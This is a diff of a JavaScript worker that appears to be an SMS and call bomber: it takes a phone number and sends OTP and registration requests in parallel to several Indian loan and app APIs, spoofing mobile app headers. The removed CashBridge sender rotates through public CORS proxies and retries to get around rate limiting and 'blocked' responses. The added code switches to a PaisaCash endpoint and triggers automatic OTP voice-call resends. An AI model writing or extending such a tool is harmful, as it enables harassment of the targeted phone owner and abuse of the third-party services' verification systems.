@@ -11,112 +11,29 @@ function randomString(len = 8) {
 }
 
 // ========================
-// Helper: sleep
+// 1) PaisaCash
 // ========================
-const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-// ========================
-// Helper: real success check
-// ========================
-function isRealSuccess(data) {
-    if (!data || typeof data !== 'object') return false;
-    if (data.dry) return false;
-    if (data.authorize && data.authorize !== '0') return false;
-    if (data.error) return false;
-    if (data.message && /frequent|try again|blocked|invalid/i.test(data.message)) return false;
-    return true;
-}
-
-// ========================
-// 1) CashBridge — Multi-strategy (direct + proxies + retries)
-// ========================
-async function sendCashBridge(phone) {
+async function sendPaisaCash(phone) {
     const clean = phone.replace(/\D/g, '');
     if (clean.length !== 10) throw new Error('10 digits required');
 
-    const targetUrl = 'https://loan.getcashbridge.com/sdkl/vitamin/bottom/react';
-    const payload = JSON.stringify({
-        govern: clean,
-        new: 'register',
-        pattern: true,
-        disaster: 'cd414c2453dd3ec74e7c879a12e438e0'
+    return await fetch('https://san.paisacashfin.com/pakh/fifth/protect/diet/stumble', {
+        method: 'POST',
+        headers: {
+            'host': 'san.paisacashfin.com',
+            'infection': '',
+            'nearly': '1.0.0',
+            'burden': 'com.paisacash.loan',
+            'content-type': 'application/json; charset=utf-8',
+            'accept-encoding': 'gzip',
+            'user-agent': 'okhttp/5.1.0'
+        },
+        body: JSON.stringify({
+            perfectly: 'd03ffaa6ce77e9b6a0c7b26dcbf16567',
+            through: clean,
+            sit: true
+        })
     });
-
-    const headers = {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Encoding': 'gzip, deflate, br, zstd',
-        'Content-Type': 'application/json',
-        'sec-ch-ua-platform': 'Android',
-        'x-version': '1.0.0',
-        'x-package-name': 'com.cash.bridge.loan.gg',
-        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-        'sec-ch-ua-mobile': '?1',
-        'versionnumber': '1.0.0',
-        'origin': 'https://loan.getcashbridge.com',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-dest': 'empty',
-        'referer': 'https://loan.getcashbridge.com/login?utm_source=chatgpt.com',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
-        'priority': 'u=1, i',
-        'Cookie': '_gcl_au=1.1.1354668386.1789809534'
-    };
-
-    // Attempt 1: Direct
-    try {
-        const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
-        const text = await r.text();
-        let data;
-        try { data = JSON.parse(text); } catch { data = text; }
-        if (isRealSuccess(data)) return { strategy: 'direct', status: r.status, data };
-    } catch (e) { /* proxy fallback */ }
-
-    // Attempt 2: Proxy wrappers
-    const proxyWrappers = [
-        (url) => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
-        (url) => `https://corsproxy.io/?${encodeURIComponent(url)}`,
-        (url) => `https://cors.eu.org/${url}`,
-        (url) => `https://thingproxy.freeboard.io/fetch/${url}`,
-        (url) => `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`
-    ];
-
-    for (let i = 0; i < proxyWrappers.length; i++) {
-        try {
-            const proxyUrl = proxyWrappers[i](targetUrl);
-            const r = await fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: payload
-            });
-            const text = await r.text();
-            let data;
-            try { data = JSON.parse(text); } catch { data = text; }
-            if (isRealSuccess(data)) return { strategy: `proxy-${i + 1}`, status: r.status, data };
-            await sleep(500);
-        } catch (e) { continue; }
-    }
-
-    // Attempt 3: Direct retries with delay
-    for (let retry = 0; retry < 3; retry++) {
-        await sleep(1000 * (retry + 1));
-        try {
-            const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
-            const text = await r.text();
-            let data;
-            try { data = JSON.parse(text); } catch { data = text; }
-            if (isRealSuccess(data)) return { strategy: `direct-retry-${retry + 1}`, status: r.status, data };
-        } catch (e) { continue; }
-    }
-
-    // All failed
-    try {
-        const r = await fetch(targetUrl, { method: 'POST', headers, body: payload });
-        const data = await r.json();
-        return { strategy: 'all-failed', status: r.status, data };
-    } catch (e) {
-        return { strategy: 'all-failed', status: 0, data: { error: e.message } };
-    }
 }
 
 // ========================
@@ -171,6 +88,7 @@ async function sendVelocity(phone) {
         'priority': 'u=1, i'
     };
 
+    // Step A: create user
     const createRes = await fetch('https://thor.velocity.in/api/v1/users/', {
         method: 'POST',
         headers,
@@ -196,6 +114,7 @@ async function sendVelocity(phone) {
         createData?.data?.uuid ||
         null;
 
+    // Step B: auto resend OTP call
     let otpData = null;
     if (otpUuid) {
         const otpRes = await fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
@@ -251,17 +170,6 @@ async function safe(name, fn, phone) {
     try {
         const r = await fn(phone);
 
-        // CashBridge returns { strategy, status, data }
-        if (r && r.strategy) {
-            return {
-                name,
-                success: isRealSuccess(r.data),
-                strategy: r.strategy,
-                status: r.status,
-                response: r.data
-            };
-        }
-
         // Velocity returns object with createUser
         if (r && r.createUser) {
             return { name, success: true, ...r };
@@ -301,7 +209,7 @@ export default {
 
         // 🔥 4 APIs parallel
         const results = await Promise.all([
-            safe('cashbridge', sendCashBridge, clean),
+            safe('paisacash', sendPaisaCash, clean),
             safe('matepaisa', sendMatePaisa, clean),
             safe('velocity', sendVelocity, clean),
             safe('beato', sendBeato, clean)
